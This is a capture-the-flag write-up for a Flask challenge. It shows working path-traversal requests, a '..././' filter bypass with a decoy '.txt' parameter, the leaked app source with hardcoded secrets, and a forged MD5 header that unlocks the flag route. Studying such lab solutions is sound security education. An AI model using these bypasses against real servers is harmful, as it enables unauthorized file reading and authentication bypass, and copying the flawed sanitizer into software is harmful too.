# web-protected-area

## Task

Web application had two api methods:

The first method could check that file is exists:
```
GET /check_perm/readable/?file=public.txt HTTP/1.1
Host: 66.172.33.148:8008

```

The second read file content:
```
GET /read_file/?file=public.txt HTTP/1.1
Host: 66.172.33.148:8008

```

The second method had filters like:
```
file = request.args.get("file").replace('../', '')
qs = request.query_string.decode('UTF-8')

    if qs.find('.txt') != (len(qs) - 4):
        return 'security'
```

## Solution

So, we could check files and directories with first method, and found next list of resources:

```
GET /check_perm/readable/?file=../../../app/application/files/private.txt HTTP/1.1

GET /check_perm/readable/?file=../../../app/config.py HTTP/1.1

GET /check_perm/readable/?file=../../../app/application/app.py HTTP/1.1

GET /check_perm/readable/?file=../../../app/application/__init__.py HTTP/1.1

GET /check_perm/readable/?file=../../../app/application/functions.py HTTP/1.1
```

Also, we could bypass filters of the second  method with next trick:
```
GET /read_file/?file=..././..././..././app/application/api.py&aaa=public.txt HTTP/1.1

<!-- Double ../ like ..././ and .txt extension in other last get param.
```

Now we could read internal files. The most important is:
`/app/application/api.py` with content:
```python

from flask import current_app as app
from flask import request, render_template, send_file
from .functions import *
from config import *
import os

@app.route('/check_perm/readable/', methods=['GET'])
def app_check_file() -> str:
    try:
        file = request.args.get("file")

        file_path = os.path.normpath('application/files/{}'.format(file))
        with open(file_path, 'r') as f:
            return str(f.readable())
    except:
        return '0'

@app.route('/read_file/', methods=['GET'])
def app_read_file() -> str:
    
    file = request.args.get("file").replace('../', '')
    qs = request.query_string.decode('UTF-8')

    if qs.find('.txt') != (len(qs) - 4):
        return 'security'
    
    try:
        return send_file('files/{}'.format(file))
    except Exception as e:
        return "500"

@app.route('/protected_area_0098', methods=['GET'])
@check_login
def app_protected_area() -> str:
    return Config.FLAG

@app.route('/', methods=['GET'])
def app_index() -> str:
    return render_template('index.html')

@app.errorhandler(404)
def not_found_error(error) -> str:
    return "Error 404"
```

And `/app/config.py` with content:
```python
import os

class Config:
    """Set Flask configuration vars from .env file."""

    # general config
    FLAG       = os.environ.get('FLAG')
    SECRET     = "s3cr3t"
    ADMIN_PASS = "b5ec168843f71c6f6c30808c78b9f55d"
    
```

After we saw check_login  wrapper open imported `/app/application/function.py` file:
```python

from flask import request, abort
from functools import wraps
import traceback, os, hashlib
from config import *

def check_login(f):
    """
    Wraps routing functions that require a user to be logged in
    """
    @wraps(f)
    def wrapper(*args, **kwds):
        try:
            ah = request.headers.get('ah')

            if ah == hashlib.md5((Config.ADMIN_PASS + Config.SECRET).encode("utf-8")).hexdigest():
                return f(*args, **kwds)
            else:
                return abort(403)

        except:
            return abort(403)
        
    return wrapper
```

After that simple create hash with data from `config.py` and send send request to `/protected_area_0098`.

